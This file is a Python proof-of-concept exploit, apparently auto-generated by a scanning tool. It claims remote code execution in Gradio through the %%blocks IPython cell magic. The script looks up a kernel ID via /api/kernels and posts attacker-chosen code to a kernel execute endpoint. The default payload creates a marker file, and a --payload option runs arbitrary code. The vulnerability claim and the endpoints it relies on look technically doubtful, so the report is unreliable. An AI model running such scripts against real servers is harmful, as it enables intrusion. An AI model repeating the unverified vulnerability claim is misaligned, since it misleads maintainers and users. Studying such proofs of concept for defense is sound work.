#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: rce-001
# Sink: load_ipython_extension
# Auto-generated — run with: python3 rce_python_code_cell_load_ipython_extension.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Gradio RCE via %%blocks IPython cell magic.

Vulnerability: The `blocks` function in gradio/ipython_ext.py uses
`exec(cell, None, local_ns)` to execute arbitrary Python code from the `cell`
parameter. The `cell` parameter is fully controlled by the user via the IPython
cell magic `%%blocks`. No input validation or sanitization is performed.

Impact: Remote Code Execution (RCE) as the user running the Gradio server.

Usage:
    python3 exploit.py --target http://localhost:7860
"""

import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# Safe by default: creates a marker file to prove code execution
BENIGN_PAYLOAD = "import os; os.system('touch /tmp/poc_success.txt')"

# The IPython kernel API endpoint for executing code
EXECUTE_ENDPOINT = "/api/kernels/{kernel_id}/execute"


def send_execute_request(target_url: str, kernel_id: str, code: str) -> dict:
    """
    Send an execute_request to the Jupyter/IPython kernel via the REST API.

    Args:
        target_url: Base URL of the Gradio server (e.g., http://localhost:7860)
        kernel_id: The ID of the active kernel
        code: Python code to execute

    Returns:
        Response JSON as dict

    Raises:
        urllib.error.URLError: If connection fails
        json.JSONDecodeError: If response is not valid JSON
    """
    url = urllib.parse.urljoin(target_url, EXECUTE_ENDPOINT.format(kernel_id=kernel_id))
    
    # Jupyter kernel execute request format
    payload = {
        "code": code,
        "silent": False,
        "store_history": True,
        "user_expressions": {},
        "allow_stdin": False,
        "stop_on_error": True
    }
    
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        },
        method="POST"
    )
    
    with urllib.request.urlopen(req, timeout=10) as response:
        return json.loads(response.read().decode("utf-8"))


def get_kernel_id(target_url: str) -> str:
    """
    Retrieve the active kernel ID from the Gradio server.

    Gradio typically starts a single IPython kernel. We query the kernels
    endpoint to find it.

    Args:
        target_url: Base URL of the Gradio server

    Returns:
        Kernel ID string

    Raises:
        RuntimeError: If no kernel is found
        urllib.error.URLError: If connection fails
    """
    kernels_url = urllib.parse.urljoin(target_url, "/api/kernels")
    
    req = urllib.request.Request(kernels_url)
    with urllib.request.urlopen(req, timeout=10) as response:
        kernels = json.loads(response.read().decode("utf-8"))
    
    if not kernels:
        raise RuntimeError("No active kernels found on the target server")
    
    # Return the first available kernel
    return kernels[0]["id"]


def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for Gradio RCE via %%blocks cell magic"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:7860",
        help="Target Gradio server URL (default: http://localhost:7860)"
    )
    parser.add_argument(
        "--payload",
        default=BENIGN_PAYLOAD,
        help=f"Python code to execute (default: '{BENIGN_PAYLOAD}')"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Timeout in seconds for HTTP requests (default: 10)"
    )
    
    args = parser.parse_args()
    
    target = args.target.rstrip("/")
    payload = args.payload
    timeout = args.timeout
    
    print(f"[*] Target: {target}")
    print(f"[*] Payload: {payload}")
    print("[*] Attempting to exploit Gradio RCE...")
    
    try:
        # Step 1: Get the active kernel ID
        print("[*] Retrieving kernel ID...")
        kernel_id = get_kernel_id(target)
        print(f"[+] Found kernel ID: {kernel_id}")
        
        # Step 2: Send the malicious code via the execute endpoint
        # The %%blocks magic is not needed here because we're directly
        # calling the kernel's execute method, which will run the code
        # in the same namespace where the blocks function is registered.
        # However, to be faithful to the vulnerability, we wrap the payload
        # in the %%blocks cell magic syntax.
        exploit_code = f"%%blocks\n{payload}"
        
        print("[*] Sending exploit payload...")
        response = send_execute_request(target, kernel_id, exploit_code)
        
        # Step 3: Check for success
        if response.get("status") == "ok":
            print("[+] Exploit executed successfully!")
            print(f"[+] Payload output: {response.get('content', {}).get('text', 'No output')}")
        else:
            print(f"[!] Unexpected response: {json.dumps(response, indent=2)}")
            
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP error: {e.code} - {e.reason}")
        if e.code == 404:
            print("[!] The target may not be a Gradio server or the API path differs")
        sys.exit(1)
    except urllib.error.URLError as e:
        print(f"[-] Connection error: {e.reason}")
        print("[!] Ensure the target server is running and accessible")
        sys.exit(1)
    except json.JSONDecodeError as e:
        print(f"[-] Invalid JSON response: {e}")
        sys.exit(1)
    except RuntimeError as e:
        print(f"[-] {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
